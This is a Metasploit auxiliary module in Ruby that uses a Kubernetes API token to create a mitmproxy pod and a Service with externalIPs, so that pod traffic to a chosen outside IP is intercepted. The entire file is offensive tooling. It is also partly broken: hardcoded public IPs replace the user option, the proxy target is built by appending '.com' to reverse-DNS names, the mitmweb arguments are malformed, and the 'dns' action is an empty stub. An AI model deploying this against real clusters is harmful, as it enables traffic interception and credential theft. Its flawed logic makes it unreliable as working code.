##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Kubernetes
  include Msf::Exploit::Remote::HTTP::Kubernetes::Enumeration

  def initialize(info = {})
    super(
      update_info(
          info,
          'Name' => 'Kubernetes MitM exploit',
          'Description' => %q{
            Intercepts pod traffic to a certain IP, and sends it to the attacker
          },
          'Author' => [ 'Hugo Delgado' ],
          'License' => MSF_LICENSE,
          'DefaultOptions' => {
            'SSL' => true,
          },
          'Actions' => [
            ['mitm', { 'Description' => 'man in the Middle a certain IP' }],
            ['dns', { 'Description' => 'spoof a DNS and redirect a petition to your IP' }],
          ],
          'DefaultAction' => 'mitm',
          'Platform' => ['linux', 'unix']
      )
    )

    register_options(
      [
        Opt::RHOSTS('https://192.168.49.2:8443', false),
        Opt::RPORT(nil, false),
        Msf::OptInt.new('SESSION', [false, 'An optional session to use for configuration']),
        OptEnum.new('OUTPUT', [true, 'output format to use', 'table', ['table']]),
        #OptEnum.new('PROTO', [true, 'protocol used', 'TCP', ['TCP, UDP']])
        Msf::OptString.new('EXTERNAL_IPS', [true, 'Comma-separated list of external IPs'])
      ]
    )  
  end

  def output_for(type)
    case type
    when 'table'
      Msf::Exploit::Remote::HTTP::Kubernetes::Output::Table.new(self)
    when 'json'
      Msf::Exploit::Remote::HTTP::Kubernetes::Output::JSON.new(self)
    end
  end
  
  def run

    require 'resolv'

    domain_names = []
    external_ips = datastore['EXTERNAL_IPS'].split(',')
    puts "External IPs: #{external_ips}"
    external_ips = ["8.8.8.8", "1.1.1.1", "140.82.121.4"]

    external_ips.each do |ip|
      begin
        domain_name = Resolv.getname(ip)
        domain_names << domain_name
      rescue Resolv::ResolvError => e
        puts "DNS lookup failed for #{ip}: #{e.message}"
      end
    end
    
    # Output the array of domain names
    puts "Domain names: #{domain_names}"

    container_image = "mitmproxy/mitmproxy"
    pod_name = "mitmproxy"
    pod_manifest = {
      kind: "Pod",
      apiVersion: "v1",
      metadata: {
      name: pod_name,
      namespace: namespace,
      labels: {
        app: "mitmproxy"
      }
      },
      spec: {
      containers: [
        {
        name: pod_name,
        image: container_image,
        command: ["mitmweb"],
        args: ["--web-host", "0.0.0.0","-p 8080", "--mode", "reverse:https://#{domain_names[0]}.com"],
        }
      ]
      }
    }

    service_name = "mitm-externalip"
    service_manifest = {
      kind: "Service",
      apiVersion: "v1",
      metadata: {
      name: service_name,
      },
      spec: {
      ports: [
        {
        name: "mitmweb",
        port: 8081,
        targetPort: 8081
        },
        {
        name: "https",
        port: 443,
        targetPort: 8080
        }
      ],
      selector: {
        app: "mitmproxy"
      },
      type: "ClusterIP",
      externalIPs: [
        external_ips[0]
      ]
      }
    }

    validate_configuration!
    
    @kubernetes_client = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new({ http_client: self, token: api_token })
    @output = output_for(datastore['output'])

    case action.name
      when 'mitm'
        output.print_status("Starting Kubernetes MitM exploit")

        output.print_status("Creating container to intercept traffic")
        begin
          create_pod(pod_manifest)
          output.print_status("Done!")
        rescue Msf::Exploit::Remote::HTTP::Kubernetes::Error::ApiError => e
          print_error(e.message)
          output.print_status("Error creating pod, exiting...")
          return
        end

        output.print_status("Creating service to redirect traffic")
        begin
          create_service(service_manifest)
          output.print_status("Done!")
        rescue Msf::Exploit::Remote::HTTP::Kubernetes::Error::ApiError => e
          print_error(e.message)
          output.print_status("Error creating service, exiting...")
          return
        end

        output.print_status("Intercepting traffic")
        output.print_status("The output can be seen in the web interface (http://127.0.0.1:8081)")

        print_status("Press any key to continue...")
        $stdin.getch

        output.print_status("Cleaning up")
        begin
          delete_service(service_name)
          delete_pod(pod_name)
          output.print_status("Done!")
        rescue Msf::Exploit::Remote::HTTP::Kubernetes::Error::ApiError => e
          print_error(e.message)
          output.print_status("Error deleting resources, exiting...")
          return
        end
      when 'dns'
        output.print_status("Starting Kubernetes DNS exploit")
    end
  end
  
end
  